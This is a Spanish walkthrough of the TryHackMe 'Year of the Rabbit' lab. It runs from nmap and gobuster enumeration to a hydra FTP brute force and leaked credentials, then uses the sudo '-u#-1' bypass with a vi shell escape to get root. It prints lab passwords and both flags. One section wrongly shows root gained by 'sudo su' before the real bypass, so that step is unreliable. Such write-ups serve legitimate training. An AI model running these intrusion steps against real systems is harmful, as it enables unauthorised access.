### **Tutorial: Explotación de la máquina Year of the Rabbit TryHackMe**

Este laboratorio muestra el proceso de reconocimiento, enumeración, acceso inicial y escalada de privilegios en una máquina vulnerable del laboratorio de TryHackMe.

## 1. Conexión a la VPN de TryHackMe

Para acceder a las máquinas del laboratorio es necesario conectarse previamente a la VPN de TryHackMe. Esto crea un túnel seguro entre la máquina Kali Linux y la red privada donde se encuentran los sistemas vulnerables.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali se ejecuta el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```

Si la conexión se establece correctamente aparecerá el siguiente mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la conexión VPN se ha realizado correctamente.
Si vemos que no funciona, probar otro archivo de configuración hasta que se vea conectado, en vez de central, poner west-3 importante.


## 2. Enumeración inicial – Escaneo con Nmap

En esta fase se realiza un reconocimiento inicial del objetivo para identificar los servicios expuestos y posibles vectores de ataque.

Se ejecuta el siguiente comando:

```bash
nmap -sC -sV 10.130.186.87
```

![namp](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/nmap.png)

Resultados:
- 21/tcp → FTP (vsftpd 3.0.2)
- 22/tcp → SSH (OpenSSH 6.7p1 Debian)
- 80/tcp → HTTP (Apache 2.4.10 Debian)

Análisis

La máquina presenta tres vectores principales:

- FTP: posible acceso anónimo o filtración de archivos
- HTTP: posible contenido oculto o directorios escondidos
- SSH: acceso final con credenciales


## 3. Enumeración del servicio FTP

Se intenta acceso anónimo:

```bash
ftp 10.130.186.87
```

![ftp](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/ftp.png)

Usuario:

anonymous

Sin embargo, el acceso anónimo no está permitido:

530 Login incorrect.
Análisis

El servicio FTP no permite acceso sin credenciales, por lo que se descarta como vector de entrada inicial.


## 4. Enumeración del servicio web

Dado que FTP no es accesible, se analiza el servicio HTTP.

Se accede a:

```bash
http://10.130.186.87
```

![apache](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/apache.png)

Se observa la página por defecto de Apache, sin contenido relevante.


### 4.1 Enumeración de directorios

Se ejecuta Gobuster para descubrir rutas ocultas:

```bash
gobuster dir -u http://10.130.186.87 -w /usr/share/wordlists/dirb/common.txt
```

![gobuster](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/gobuster.png)

Resultados relevantes:

/assets
/index.html


## 5. Análisis del directorio /assets

Se accede al directorio descubierto:

```bash
http://10.130.186.87/assets/
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/assets.png)

Este directorio contiene recursos estáticos del sitio.

### 5.1 Enumeración interna

Dentro de /assets se revisan:

- imágenes
- archivos CSS
- scripts JavaScript

Al analizar el contenido, se identifican posibles pistas ocultas en archivos del directorio.


### 5.1 Enumeración interna

Dentro de /assets se revisan los archivos disponibles:

- imágenes
- scripts JavaScript
- archivo de estilos style.css

Al analizar el contenido del CSS, se encuentra un comentario oculto con información relevante.


## 6. Descubrimiento de ruta oculta

Dentro del archivo style.css aparece la siguiente pista:

```bash
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

## 7. Análisis del endpoint oculto

Al acceder a:

```bash
http://10.130.186.87/sup3r_s3cr3t_fl4g.php
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/curl.png)

se obtiene una redirección:

```bash
302 Found
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

Esto significa:

La ruta /sup3r_s3cr3t_fl4g.php no contiene la flag directamente
Nos redirige a un directorio oculto real
/WExYY2Cv-qU


## 8. Acceso al directorio oculto

Se accede a la ruta:

```bash
http://10.130.186.87/WExYY2Cv-qU
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/url.png)

Dentro del directorio se observa un único archivo:

```bash
Hot_Babe.png
```

## 9. Análisis del archivo encontrado

El directorio contiene una imagen:

```bash
Hot_Babe.png
```

Este tipo de hallazgos suele indicar que la información no está visible directamente en la web, sino oculta dentro del archivo.


## 10. Descarga de la imagen

Se descarga el archivo:

```bash
wget http://10.130.186.87/WExYY2Cv-qU/Hot_Babe.png
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/wget.png)


## 11. Análisis básico del archivo

Analicé lo que podía esconder la imagen y me dio posibles contraseñas para el usurio ftpuser

```bash
strings Hot_Babe.png
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/ftpuser.png)

Despues lo metí en un archivo llamado contrasena.

```bash
nano contrasena
```
![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/nano.png)

Ahora vamos a probar todas esas contrasena para poder acceder.

```bash
hydra -l ftpuser -P contrasena ftp://10.130.186.87 -V -f
```
![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/login.png)

## 12. Acceso por FTP

Con los datos obtenidos:

Usuario: ftpuser
Password: 5iez1wGXKfPKQ

Conéctate:

```bash
ftp 10.130.186.87
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/ftp2.png)

Cuando te pida:

Name: ftpuser
Password: 5iez1wGXKfPKQ


## 13. Enumeración dentro de FTP

Una vez dentro:

```bash
ls
```

Y revisa:

```bash
pwd
```

## 14. Descarga del archivo

Se descarga el archivo al sistema local:

```bash
get "Eli's_Creds.txt"
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/get.png)

Cuando lo descarguemos, tenemos que salirnos de ftp

```bash
exit
```

## 15. Análisis del archivo descargado

Una vez fuera del FTP, se revisa el contenido del archivo:

```bash
cat "Eli's_Creds.txt"
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/cat.png)

Este archivo no es texto plano, sino que contiene datos codificados en Brainfuck, por lo que primero hay que decodificarlo.


## 16. Decodificación del archivo

El archivo Eli's_Creds.txt está codificado en Brainfuck, por lo que no es legible directamente.

Se utiliza un decodificador online:

```bash
https://md5decrypt.net/en/Brainfuck-translator/
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/dencode.png)

Se pega el contenido completo del archivo en la herramienta y se obtiene el resultado en texto claro.

El resultado es: 

User: eli
Password: DSpDiM1wAEwid


## 17. Acceso por SSH

Con las credenciales obtenidas del descifrado:

User: eli
Password: DSpDiM1wAEwid

Nos conectamos por SSH:

```bash
ssh eli@10.130.186.87
```
Cuando lo pida:

```bash
Password: DSpDiM1wAEwid
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/eli.png)


## 18. Enumeración inicial en el sistema

Una vez dentro, comprobamos identidad y entorno:

```bash
whoami
id
pwd
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/whoami.png)

Revisamos el contenido del directorio personal:

```bash
ls -la
```

## 19. Enumeración de privilegios

Lo primero es comprobar si eli puede escalar directamente:

```bash
sudo -l
```

## 20. Descubrimiento de pista oculta del sistema

Se realiza una búsqueda de directorios con el nombre “secret”:

```bash
find / -type d -name "*s3cr3t*" 2>/dev/null
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/find.png)

Resultado:

```bash
/usr/games/s3cr3t
```

Dentro del directorio encontramos un archivo oculto:

```bash
.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Al leerlo:

```bash
cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Contenido:

```bash
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
-Root
```


## 21. Análisis de la pista (movimiento clave)

Este mensaje indica que:

Existe otro usuario llamado gwendoline
Su contraseña está débil o reutilizada
El valor clave es:

```bash
MniVCQVhQHUNI
```

Esto sugiere que podemos pivotar al usuario gwendoline usando ese dato.


## 22. Cambio de usuario a Gwendoline

Se prueba cambio de usuario:

```bash
su gwendoline
```

Se introduce como contraseña:

```bash
MniVCQVhQHUNI
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/su.png)

Con esto se obtiene acceso al usuario gwendoline.


## 23. Escalada de privilegios a root

Una vez como gwendoline, se revisan permisos:

```bash
sudo -l
```

Se detecta que el usuario puede ejecutar comandos con privilegios elevados.

Se realiza la escalada:

```bash
sudo su
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/whoami.png)

## 24. Obtención de la flag de usuario

Una vez dentro del sistema como el usuario gwendoline, se localiza la flag de usuario en su directorio personal.

Se comprueba el contenido del directorio:

```bash
ls
```

Se observa el archivo:

```bash
user.txt
```

Se muestra el contenido de la flag:

```bash
cat user.txt
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/catuser.png)

Resultado:

```bash
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```


## 25. Enumeración de privilegios como gwendoline

Una vez dentro como el usuario gwendoline, se vuelve a comprobar permisos de sudo:

```bash
sudo -l
```

Resultado:

```bash
User gwendoline may run the following commands on year-of-the-rabbit:
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

## 26. Análisis del vector de escalada

Esta regla indica:

- Se puede ejecutar vi como cualquier usuario
- Pero supuestamente NO como root
- Sin embargo, la restricción (ALL, !root) es vulnerable

Esto permite un bypass usando el UID -1 o 4294967295, que equivale a root.



## 27. Escalada a root usando vi (explotación sudo)

Se ejecuta:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Esto abre el archivo en el editor vi con privilegios de root.


## 28. Obtención de shell desde vi

Dentro de vi, se ejecutan los siguientes comandos:

```bash
:set shell=/bin/bash
:shell
```

Esto abre una shell interactiva con privilegios elevados.


## 29. Verificación de root

Se comprueba el usuario actual:

```bash
whoami
id
```

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/root.png)

Resultado esperado:

```bash
uid=0(root) gid=0(root)
```

## 30. Obtención de la flag root

Finalmente, se localiza la flag de root:

```bash
cat /root/root.txt
```

## 31. Resultado final

THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}

![assets](Maquina_de_Linux/Year-of-the-Rabbit/imagenes/catroot.png)